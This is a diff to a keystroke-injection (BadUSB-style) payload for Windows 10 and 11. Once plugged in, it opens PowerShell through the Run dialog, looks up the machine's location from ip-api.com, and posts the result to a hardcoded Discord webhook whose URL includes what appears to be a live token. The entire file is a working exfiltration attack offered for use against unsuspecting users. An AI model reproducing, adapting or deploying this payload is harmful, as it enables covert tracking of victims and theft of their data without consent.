@@ -1,4 +1,26 @@
 REM This Payload is made by bst04 and jk759.
 REM This version supports Windows 10 and 11
+REM Abre PowerShell
+DELAY 500
 GUI r
-STRINGLN powershell -w h -NoP 
+DELAY 500
+STRING powershell
+ENTER
+DELAY 500
+STRING $location = (Invoke-WebRequest -Uri "http://ip-api.com/json").Content | ConvertFrom-Json
+ENTER
+DELAY 500
+STRING $webhookUrl = "https://discord.com/api/webhooks/1296512673327878145/0h0RYRZEzKa3mIOsSYOJFLbRcxs5KUBhxP1oBbWdbKqbPgzKvENd8yKmyxALnTnpylOL"
+ENTER
+DELAY 500
+STRING $payload = @{
+ENTER
+DELAY 500
+STRING     location = $location
+ENTER
+DELAY 500
+STRING } | ConvertTo-Json
+ENTER
+DELAY 500
+STRING Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
+ENTER
